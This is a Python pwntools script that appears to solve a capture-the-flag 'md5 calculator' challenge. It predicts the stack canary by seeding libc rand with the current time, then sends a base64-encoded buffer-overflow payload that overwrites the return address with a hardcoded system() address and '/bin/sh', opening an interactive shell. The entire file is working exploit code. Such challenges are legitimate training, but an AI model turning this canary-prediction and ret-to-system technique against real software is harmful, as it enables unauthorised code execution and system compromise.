import pwn
import ctypes
import time

# p = pwn.process('/repositories/crackme_challenges/pwnable/md5_calculator/a.out')
# p = pwn.remote("mercury.picoctf.net", 23584)
# p = pwn.remote("localhost", 8080)

libc = ctypes.CDLL("libc.so.6")

# init rand
seed = int(time.time())
libc.srand(seed)
p = pwn.process('/repositories/crackme_challenges/pwnable/md5_calculator/hash')

SYSTEM_ADDRESS =  0xf7acd170
MAIN = 0x0804908f

def next_rand():
    return libc.rand()

def get_cpatcha() -> int:
    captcha = int(p.recvline())
    print(captcha)
    p.sendline(str(captcha))
    return captcha

def calc_cannary(captcha: int) -> int:
    buff = [next_rand() for _ in range(8)]
    return (captcha - (buff[1] + buff[5] + buff[2] - buff[3] + buff[7] - buff[6] + buff[4])) & 0xffffffff

def main():
    p.readuntil("Are you human? input captcha :").decode("utf8")
    captcha = get_cpatcha()
    cannary = calc_cannary(captcha)
    print(f"cannary: {cannary}")
    #
    p.readuntil("paste me!")
    pyload = [
        b'A' * 512,
        pwn.p32(cannary),
        b'A' * 12,
        pwn.p32(SYSTEM_ADDRESS),
        b'/bin/sh\x00'
    ]
    p.sendline(pwn.b64e(b"".join(pyload)))
    pass

if __name__ == "__main__":
    main()

p.interactive()
